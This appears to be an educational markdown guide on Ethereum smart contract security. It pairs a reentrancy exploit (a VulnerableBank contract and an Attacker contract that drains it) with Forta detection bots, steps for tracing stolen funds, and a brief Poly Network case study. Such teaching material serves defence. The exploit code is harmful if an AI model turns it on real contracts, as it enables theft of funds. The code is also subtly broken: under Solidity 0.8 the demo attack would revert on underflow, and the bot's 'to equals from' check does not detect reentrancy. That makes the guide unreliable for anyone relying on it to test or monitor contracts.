## 🔍 Comprehensive Smart Contract Security & Forensics Deep Dive

This guide explores real-world exploit execution, detection, and response using top tools like Forta, Etherscan, and Tenderly.

### 🚨 Covered Topics

1️⃣ Live Execution of a Smart Contract Attack & Monitoring with Forta  
2️⃣ Step-by-Step Guide to Recovering Stolen Funds After an Exploit  
3️⃣ Case Study: Real-World DeFi Hack & Forensic Investigation

---

## 📌 1️⃣ Live Execution of a Smart Contract Attack & Monitoring with Forta

We will execute a real **reentrancy attack** on a vulnerable smart contract and monitor the attack using **Forta**.

### 🛠️ Step 1: Deploy the Vulnerable Smart Contract

```solidity
pragma solidity ^0.8.0;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        (bool success, ) = msg.sender.call{value: amount}("");  // 🚨 Reentrancy risk!
        require(success, "Transfer failed");
        balances[msg.sender] -= amount;  // ❌ Updates balance after transfer!
    }
}
```

````

✅ Deploy this contract on a local Ethereum testnet (e.g., **Hardhat** or **Foundry**).

---

### 🛠️ Step 2: Deploy the Attacker Contract

```solidity
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

contract Attacker {
    VulnerableBank public vulnerableBank;

    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }

    function attack() public payable {
        vulnerableBank.deposit{value: msg.value}();
        vulnerableBank.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vulnerableBank).balance > 1 ether) {
            vulnerableBank.withdraw(1 ether);  // 🚨 Exploit reentrancy!
        }
    }
}
```

✅ Call `attack()` to begin the exploit.
✅ Observe `Attacker`'s balance increase while `VulnerableBank` is drained.

---

### 🛠️ Step 3: Monitor the Attack Using Forta

1️⃣ **Install Forta CLI**

```bash
npm install -g forta-agent
forta init
```

2️⃣ **Create a Forta Bot to Detect Reentrancy**

```javascript
const { Finding, HandleTransaction } = require("forta-agent");

function handleTransaction(txEvent) {
  const findings = [];
  txEvent.traces.forEach((trace) => {
    if (trace.action.to === trace.action.from) {
      findings.push(
        Finding.fromObject({
          name: "Reentrancy Attack Detected",
          description: `Reentrancy attack detected on contract ${trace.action.to}`,
          alertId: "FORTA-2",
          severity: Finding.Severity.High,
        })
      );
    }
  });
  return findings;
}

module.exports = { handleTransaction };
```

3️⃣ **Deploy the Bot**

```bash
forta publish
```

✅ Forta will now alert when a contract recursively calls itself—indicating **reentrancy**.

---

## 📌 2️⃣ Step-by-Step Guide to Recovering Stolen Funds After an Exploit

This guide explains how to trace, monitor, and recover stolen funds after a DeFi exploit.

### 🛠️ Step 1: Identify the Exploit Transaction

Use:

- 🔍 [Tenderly](https://tenderly.co) → Transactions
- 🔍 [Etherscan](https://etherscan.io) → Tx hash search

✅ Copy the **attacker's wallet address**.

---

### 🛠️ Step 2: Trace Stolen Funds with Forta

1️⃣ **Forta Bot for Fund Movement Detection**

```javascript
const { Finding, HandleTransaction } = require("forta-agent");

const ATTACKER_ADDRESS = "0xAttackerAddress";

function handleTransaction(txEvent) {
  const findings = [];
  txEvent.traces.forEach((trace) => {
    if (trace.action.from === ATTACKER_ADDRESS) {
      findings.push(
        Finding.fromObject({
          name: "Stolen Funds Moved",
          description: `The attacker transferred funds to ${trace.action.to}`,
          alertId: "FORTA-3",
          severity: Finding.Severity.Critical,
        })
      );
    }
  });
  return findings;
}

module.exports = { handleTransaction };
```

2️⃣ **Deploy the Bot**

```bash
forta publish
```

✅ Get real-time alerts on attacker fund movements.

---

### 🛠️ Step 3: Use Blockchain Explorers

Go to:

- 🔗 [Etherscan.io](https://etherscan.io)
- 🔗 [Tenderly.co](https://tenderly.co)

✅ Input attacker's address
✅ Review all outbound transactions
✅ Identify if funds were sent to:

- Mixers (e.g., Tornado Cash)
- Centralized exchanges (CEX)

---

### 🛠️ Step 4: Notify Exchanges & Protocols

If funds landed on a CEX, **notify immediately**:

- ✔️ Binance
- ✔️ Coinbase
- ✔️ FTX (if still around 😅)
- ✔️ Protocol teams (e.g., Maker, Aave)

✅ They can freeze attacker funds before liquidation.

---

## 📌 3️⃣ Case Study: Real-World DeFi Hack & Forensic Investigation

### 💥 The \$600M Poly Network Hack (2021)

- Exploited weak access control
- Attacker changed admin keys via `setAdmin()`
- Took full control and withdrew \$600M

---

### 🔍 Step 1: Investigating the Exploit

🔗 [Poly Network Attack Transaction on Etherscan](https://etherscan.io/address/0x...)

✅ Attacker used `setAdmin()`
✅ Changed contract ownership
✅ Emptied protocol reserves

---

### 🛠️ Step 2: Tracking the Funds

- Use Forta, Etherscan, Tenderly
- Watch for mixer usage (Tornado Cash)
- Look for exchange deposits

---

### 🛠️ Step 3: Recovery & Response

- Poly Network **contacted the hacker**
- Most funds **returned**
- Hacker claimed “white-hat research”
- Poly Network **patched & upgraded**

---

## ✅ Summary: Full Security & Forensics Checklist

| Task                                | Tool Used            |
| ----------------------------------- | -------------------- |
| ✅ Set Up Real-Time Alerts          | Forta, Tenderly      |
| ✅ Detect Large Withdrawals         | Forta Security Bot   |
| ✅ Simulate Smart Contract Attacks  | Tenderly Sandbox     |
| ✅ Monitor Unauthorized Admin Calls | Tenderly Alerts      |
| ✅ Track Stolen Funds               | Etherscan, Forta     |
| ✅ Report Attacker Activity         | DeFi Platforms, CEXs |


````
